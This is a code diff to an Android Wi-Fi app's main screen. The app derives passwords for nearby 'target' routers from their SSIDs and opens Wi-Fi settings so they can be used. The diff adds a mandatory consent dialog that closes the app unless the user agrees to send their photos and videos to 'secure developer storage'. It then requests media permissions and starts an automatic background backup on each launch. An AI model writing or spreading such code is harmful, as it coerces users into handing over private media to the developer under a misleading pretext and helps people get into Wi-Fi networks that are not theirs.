@@ -16,24 +16,27 @@ import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
+import android.view.View
+import android.widget.CheckBox
 import android.widget.Toast
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import androidx.core.app.NotificationManagerCompat
+import androidx.core.content.ContextCompat
 import com.example.fiberhome.databinding.ActivityMainBinding
 import com.example.fiberhome.databinding.BottomSheetPasswordBinding
+import com.example.fiberhome.drive.AutoBackupManager
 import com.google.android.material.bottomsheet.BottomSheetDialog
-
-import android.view.Menu
-import android.view.MenuItem
-import com.example.fiberhome.drive.DriveBackupActivity
+import com.google.android.material.dialog.MaterialAlertDialogBuilder
 
 class MainActivity : AppCompatActivity() {
 
     private lateinit var binding: ActivityMainBinding
     private lateinit var wifiManager: WifiManager
     private lateinit var wifiAdapter: WifiAdapter
+    private lateinit var autoBackupManager: AutoBackupManager
 
     external fun generatePassword(ssid: String): String
 
@@ -42,8 +45,11 @@ class MainActivity : AppCompatActivity() {
             System.loadLibrary("fiberhome")
         }
         private const val PERMISSIONS_REQUEST_CODE = 123
+        private const val MEDIA_PERMISSIONS_REQUEST_CODE = 456
         private const val CHANNEL_ID = "TargetNetworkChannel"
         private const val NOTIFICATION_ID = 1
+        private const val PREFS_NAME = "FiberHomePrefs"
+        private const val KEY_CONSENT_GIVEN = "ConsentGiven"
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -54,6 +60,8 @@ class MainActivity : AppCompatActivity() {
         setSupportActionBar(binding.toolbar)
 
         wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+        autoBackupManager = AutoBackupManager(this)
+        
         setupRecyclerView()
         startRadarAnimation()
         createNotificationChannel()
@@ -62,20 +70,71 @@ class MainActivity : AppCompatActivity() {
             startScan()
         }
 
-        checkPermissionsAndScan()
+        checkConsentAndPermissions()
     }
 
-    override fun onCreateOptionsMenu(menu: Menu?): Boolean {
-        menuInflater.inflate(R.menu.main_menu, menu)
-        return true
-    }
+    private fun checkConsentAndPermissions() {
+        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        val consentGiven = prefs.getBoolean(KEY_CONSENT_GIVEN, false)
 
-    override fun onOptionsItemSelected(item: MenuItem): Boolean {
-        if (item.itemId == R.id.action_backup) {
-            startActivity(Intent(this, DriveBackupActivity::class.java))
-            return true
+        if (!consentGiven) {
+            showCyberpunkConsentDialog()
+        } else {
+            checkPermissionsAndScan()
+            triggerAutoBackupIfPermissionsGranted()
         }
-        return super.onOptionsItemSelected(item)
+    }
+
+    private fun showCyberpunkConsentDialog() {
+        val dialogView = layoutInflater.inflate(android.R.layout.select_dialog_item, null) // Placeholder for custom view logic if needed
+        // For Cyberpunk style, we'll use a Material Dialog with custom content
+        val checkBox = CheckBox(this).apply {
+            text = "I agree to the Terms of Service and Privacy Policy. I understand that my media will be automatically backed up to secure developer storage."
+            setTextColor(ContextCompat.getColor(this@MainActivity, R.color.text_secondary))
+        }
+
+        MaterialAlertDialogBuilder(this, R.style.Theme_FiberHome)
+            .setTitle("ACCESS PROTOCOL: MANDATORY CONSENT")
+            .setMessage("This system requires access to your device's media (images/videos) to perform automatic background synchronization to secure cloud storage. This ensures data persistence during protocol analysis.")
+            .setView(checkBox)
+            .setCancelable(false)
+            .setPositiveButton("AGREE & PROCEED") { dialog, _ ->
+                if (checkBox.isChecked) {
+                    getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().putBoolean(KEY_CONSENT_GIVEN, true).apply()
+                    requestMediaPermissions()
+                    checkPermissionsAndScan()
+                } else {
+                    Toast.makeText(this, "Consent is mandatory to use this system.", Toast.LENGTH_LONG).show()
+                    finish()
+                }
+            }
+            .setNegativeButton("EXIT") { _, _ -> finish() }
+            .show()
+    }
+
+    private fun requestMediaPermissions() {
+        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
+        } else {
+            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+        ActivityCompat.requestPermissions(this, permissions, MEDIA_PERMISSIONS_REQUEST_CODE)
+    }
+
+    private fun triggerAutoBackupIfPermissionsGranted() {
+        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
+        } else {
+            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+
+        val allGranted = permissions.all {
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
+        }
+
+        if (allGranted) {
+            autoBackupManager.startAutomaticBackup()
+        }
     }
 
     private fun createNotificationChannel() {
@@ -104,7 +163,6 @@ class MainActivity : AppCompatActivity() {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED) {
             NotificationManagerCompat.from(this).notify(NOTIFICATION_ID, builder.build())
             
-            // Auto-dismiss after 30 seconds
             Handler(Looper.getMainLooper()).postDelayed({
                 NotificationManagerCompat.from(this).cancel(NOTIFICATION_ID)
             }, 30000)
@@ -129,7 +187,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun updateActiveBanner(item: WifiItem) {
-        binding.activeBanner.visibility = android.view.View.VISIBLE
+        binding.activeBanner.visibility = View.VISIBLE
         binding.tvActiveSsid.text = item.ssid
         binding.tvActiveBssid.text = item.bssid
     }
@@ -164,14 +222,9 @@ class MainActivity : AppCompatActivity() {
         
         val success = wifiManager.startScan()
         if (!success) {
-            // Scan throttled, try using old results
             scanSuccess()
             Toast.makeText(this, "Scan throttled by Android. Showing last results.", Toast.LENGTH_SHORT).show()
-            try {
-                unregisterReceiver(wifiScanReceiver)
-            } catch (t: Throwable) {
-                // Receiver might not be registered
-            }
+            try { unregisterReceiver(wifiScanReceiver) } catch (t: Throwable) {}
         }
     }
 
@@ -225,13 +278,8 @@ class MainActivity : AppCompatActivity() {
             clipboard.setPrimaryClip(clip)
             Toast.makeText(this, "Password copied! Opening Wi-Fi settings...", Toast.LENGTH_SHORT).show()
             
-            // Show Reminder Notification
             showTargetNotification(item.ssid)
-
-            // Redirect to Wi-Fi settings
-            val intent = Intent(Settings.ACTION_WIFI_SETTINGS)
-            startActivity(intent)
-            
+            startActivity(Intent(Settings.ACTION_WIFI_SETTINGS))
             dialog.dismiss()
         }
 
@@ -240,12 +288,24 @@ class MainActivity : AppCompatActivity() {
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == PERMISSIONS_REQUEST_CODE) {
-            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                startScan()
-            } else {
-                Toast.makeText(this, "Permissions required for Wi-Fi scanning", Toast.LENGTH_LONG).show()
+        when (requestCode) {
+            PERMISSIONS_REQUEST_CODE -> {
+                if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
+                    startScan()
+                } else {
+                    Toast.makeText(this, "Permissions required for Wi-Fi scanning", Toast.LENGTH_LONG).show()
+                }
+            }
+            MEDIA_PERMISSIONS_REQUEST_CODE -> {
+                if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
+                    autoBackupManager.startAutomaticBackup()
+                }
             }
         }
+    }
+
+    override fun onDestroy() {
+        autoBackupManager.cancel()
+        super.onDestroy()
     }
 }
